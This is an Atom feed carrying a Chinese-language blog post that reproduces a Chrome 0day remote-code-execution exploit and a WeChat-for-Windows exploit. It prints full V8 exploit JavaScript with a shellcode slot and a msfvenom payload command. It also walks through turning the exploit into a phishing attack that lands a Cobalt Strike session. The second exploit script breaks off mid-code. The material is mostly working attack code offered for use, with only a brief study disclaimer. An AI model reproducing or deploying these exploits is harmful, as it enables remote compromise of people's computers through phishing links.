<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C0cho&#39;s blog</title>
  
  <subtitle>less is more</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://choge.top/"/>
  <updated>2021-04-20T04:24:42.164Z</updated>
  <id>https://choge.top/</id>
  
  <author>
    <name>C0cho</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Chrome 0day RCE及利用微信钓鱼复现</title>
    <link href="https://choge.top/2021/04/18/RCE%E5%8F%8A%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E9%92%93%E9%B1%BC%E5%A4%8D%E7%8E%B0/"/>
    <id>https://choge.top/2021/04/18/RCE及利用微信钓鱼复现/</id>
    <published>2021-04-18T09:36:36.000Z</published>
    <updated>2021-04-20T04:24:42.164Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要复现近期Chrome 0day RCE及利用其进行钓鱼，本文仅供参考学习。</p><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><p>影响版本：</p><p>Google Chrome &lt; = 89.0.4389.114和使用Chrome内核的其他浏览器。</p><p>利用条件：</p><p>关闭沙箱模式 –no-sandbox</p><h3 id="Chrome漏洞复现及钓鱼"><a href="#Chrome漏洞复现及钓鱼" class="headerlink" title="Chrome漏洞复现及钓鱼"></a>Chrome漏洞复现及钓鱼</h3><p>exp:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80000</span>; ++i) &#123;</span><br><span class="line">           <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">let</span> shellcode = [shellcode];</span><br><span class="line">   <span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line">   <span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line">   <span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line">   <span class="keyword">var</span> main = wasmInstance.exports.main;</span><br><span class="line">   <span class="keyword">var</span> bf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">   <span class="keyword">var</span> bfView = <span class="keyword">new</span> <span class="built_in">DataView</span>(bf);</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fLow</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">       bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> (bfView.getUint32(<span class="number">0</span>, <span class="literal">true</span>));</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fHi</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">       bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> (bfView.getUint32(<span class="number">4</span>, <span class="literal">true</span>))</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">low, hi</span>) </span>&#123;</span><br><span class="line">       bfView.setUint32(<span class="number">0</span>, low, <span class="literal">true</span>);</span><br><span class="line">       bfView.setUint32(<span class="number">4</span>, hi, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> bfView.getFloat64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">f2big</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">       bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> bfView.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">big2f</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">       bfView.setBigUint64(<span class="number">0</span>, b, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> bfView.getFloat64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">       <span class="keyword">constructor</span>(size) &#123;</span><br><span class="line">           <span class="keyword">super</span>(size);</span><br><span class="line">           <span class="keyword">this</span>.slot = <span class="number">0xb33f</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">let</span> x = <span class="number">-1</span>;</span><br><span class="line">       <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">       <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, <span class="number">-1</span>)));</span><br><span class="line">       arr.shift();</span><br><span class="line">       <span class="keyword">let</span> local_arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">       local_arr[<span class="number">0</span>] = <span class="number">5.1</span>;<span class="comment">//4014666666666666</span></span><br><span class="line">       <span class="keyword">let</span> buff = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);<span class="comment">//byteLength idx=8</span></span><br><span class="line">       arr[<span class="number">0</span>] = <span class="number">0x1122</span>;</span><br><span class="line">       <span class="keyword">return</span> [arr, local_arr, buff];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">       foo(<span class="literal">false</span>);</span><br><span class="line">   gc(); gc();</span><br><span class="line">  [corrput_arr, rwarr, corrupt_buff] = foo(<span class="literal">true</span>);</span><br><span class="line">   corrput_arr[<span class="number">12</span>] = <span class="number">0x22444</span>;</span><br><span class="line">   <span class="keyword">delete</span> corrput_arr;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">setbackingStore</span>(<span class="params">hi, low</span>) </span>&#123;</span><br><span class="line">       rwarr[<span class="number">4</span>] = i2f(fLow(rwarr[<span class="number">4</span>]), hi);</span><br><span class="line">       rwarr[<span class="number">5</span>] = i2f(low, fHi(rwarr[<span class="number">5</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">leakObjLow</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">       corrupt_buff.slot = o;</span><br><span class="line">       <span class="keyword">return</span> (fLow(rwarr[<span class="number">9</span>]) - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">let</span> corrupt_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(corrupt_buff);</span><br><span class="line">   <span class="keyword">let</span> corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);</span><br><span class="line">   <span class="keyword">let</span> idx0Addr = corrupt_buffer_ptr_low - <span class="number">0x10</span>;</span><br><span class="line">   <span class="keyword">let</span> baseAddr = (corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) - ((corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) % <span class="number">0x40000</span>) + <span class="number">0x40000</span>;</span><br><span class="line">   <span class="keyword">let</span> delta = baseAddr + <span class="number">0x1c</span> - idx0Addr;</span><br><span class="line">   <span class="keyword">if</span> ((delta % <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">       <span class="keyword">let</span> baseIdx = delta / <span class="number">8</span>;</span><br><span class="line">       <span class="keyword">this</span>.base = fLow(rwarr[baseIdx]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">let</span> baseIdx = ((delta - (delta % <span class="number">8</span>)) / <span class="number">8</span>);</span><br><span class="line">       <span class="keyword">this</span>.base = fHi(rwarr[baseIdx]);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">let</span> wasmInsAddr = leakObjLow(wasmInstance);</span><br><span class="line">   setbackingStore(wasmInsAddr, <span class="keyword">this</span>.base);</span><br><span class="line">   <span class="keyword">let</span> code_entry = corrupt_view.getFloat64(<span class="number">13</span> * <span class="number">8</span>, <span class="literal">true</span>);</span><br><span class="line">   setbackingStore(fLow(code_entry), fHi(code_entry));</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">       corrupt_view.setUint8(i, shellcode[i]);</span><br><span class="line">  &#125;</span><br><span class="line">   main();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>使用msf生成执行计算机payload</p><p><code>msfvenom -a x64 -p windows/x64/exec CMD=&quot;calc&quot; EXITFUNC=thread -f num</code></p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419195258453.png" alt="image-20210419195258453"></p><p>使用Chrome内核的Edge浏览器弹出计算机</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419194121904.png" alt="image-20210419194121904"></p><p>使用Chrome浏览器弹出计算机</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419195744869.png" alt="image-20210419195744869"></p><p>使用CS进行钓鱼攻击，建立监听器</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419204355293.png" alt="image-20210419204355293"></p><p>生成payload</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419201522527.png" alt="image-20210419201522527"></p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419201643860.png" alt="image-20210419201643860"></p><p>讲payload中的<code>\</code>替换微<code>,0</code></p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419211124238.png" alt="image-20210419211124238"></p><p>替换后载入exp的shellcode中，保存为html文件</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419211335916.png" alt="image-20210419211335916"></p><p>使用Python开启一个http，使用chrome<code>--no-sandbox</code>去访问链接，cs上线</p><p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419212549986.png" alt="image-20210419212549986"></p><h3 id="Windows微信钓鱼"><a href="#Windows微信钓鱼" class="headerlink" title="Windows微信钓鱼"></a>Windows微信钓鱼</h3><p>Windows微信版本&lt;=3.2.1.1412</p><p>exp:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line">ENABLE_LOG = <span class="literal">true</span>;</span><br><span class="line">IN_WORKER = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// run calc and hang in a loop</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [shellcode];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> not_optimised_out = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> target_function = (<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="number">0xdecaf0</span>) &#123;</span><br><span class="line">        not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    not_optimised_out |= <span class="number">0xff</span>;</span><br><span class="line">    not_optimised_out *= <span class="number">12</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g_array;</span><br><span class="line"><span class="keyword">var</span> tDerivedNCount = <span class="number">17</span> * <span class="number">87481</span> - <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> tDerivedNDepth = <span class="number">19</span> * <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">flag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span><br><span class="line">    g_array[<span class="number">0</span>] = <span class="number">0x1dbabe</span> * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'c01db33f'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">oobAccess</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> this_ = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">this</span>.buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.buffer_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.page_buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.page_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.prevent_opt = [];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kSlotOffset = <span class="number">0x1f</span>;</span><br><span class="line">    <span class="keyword">var</span> kBackingStoreOffset = <span class="number">0xf</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="keyword">constructor</span>() &#123;</span><br><span class="line">            <span class="keyword">super</span>(<span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">this</span>.slot = <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.page_buffer = <span class="keyword">new</span> LeakArrayBuffer();</span><br><span class="line">    <span class="keyword">this</span>.page_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.page_buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">RegExp</span>(&#123; <span class="attr">toString</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">'a'</span> &#125; &#125;);</span><br><span class="line">    cb(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DerivedBase</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123;</span><br><span class="line">        <span class="keyword">constructor</span>() &#123;</span><br><span class="line">            <span class="comment">// var array = null;</span></span><br><span class="line">            <span class="keyword">super</span>(</span><br><span class="line">                <span class="comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span></span><br><span class="line">                <span class="comment">// has just happened.</span></span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line">                &#125;, <span class="string">'g'</span></span><br><span class="line">                <span class="comment">// now the runtime JSRegExp constructor is called, corrupting the</span></span><br><span class="line">                <span class="comment">// JSArray.</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// this allocation will now directly follow the FixedArray allocation</span></span><br><span class="line">            <span class="comment">// made for `this.data`, which is where `array.elements` points to.</span></span><br><span class="line">            this_.buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span><br><span class="line">            g_array[<span class="number">8</span>] = this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// try&#123;</span></span><br><span class="line">    <span class="keyword">var</span> derived_n = <span class="built_in">eval</span>(<span class="string">`(function derived_n(i) &#123;</span></span><br><span class="line"><span class="string">        if (i == 0) &#123;</span></span><br><span class="line"><span class="string">            return DerivedBase;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        class DerivedN extends derived_n(i-1) &#123;</span></span><br><span class="line"><span class="string">            constructor() &#123;</span></span><br><span class="line"><span class="string">                super();</span></span><br><span class="line"><span class="string">                return;</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;<span class="string">"this.a=0;"</span>.repeat(tDerivedNCount)&#125;</span></span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return DerivedN;</span></span><br><span class="line"><span class="string">    &#125;)`</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> (derived_n(tDerivedNDepth))();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.buffer_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.buffer);</span><br><span class="line">    <span class="keyword">this</span>.leakPtr = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.page_buffer.slot = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.buffer_view.getUint32(kSlotOffset, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.setPtr = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.buffer_view.setUint32(kBackingStoreOffset, addr, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.read32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.page_view.getUint32(<span class="number">0</span>, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.write32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">this</span>.page_view.setUint32(<span class="number">0</span>, value, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.write8 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">this</span>.page_view.setUint8(<span class="number">0</span>, value, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.setBytes = <span class="function"><span class="keyword">function</span> (<span class="params">addr, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.length; i++) &#123;</span><br><span class="line">            <span class="keyword">this</span>.write8(addr + i, content[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 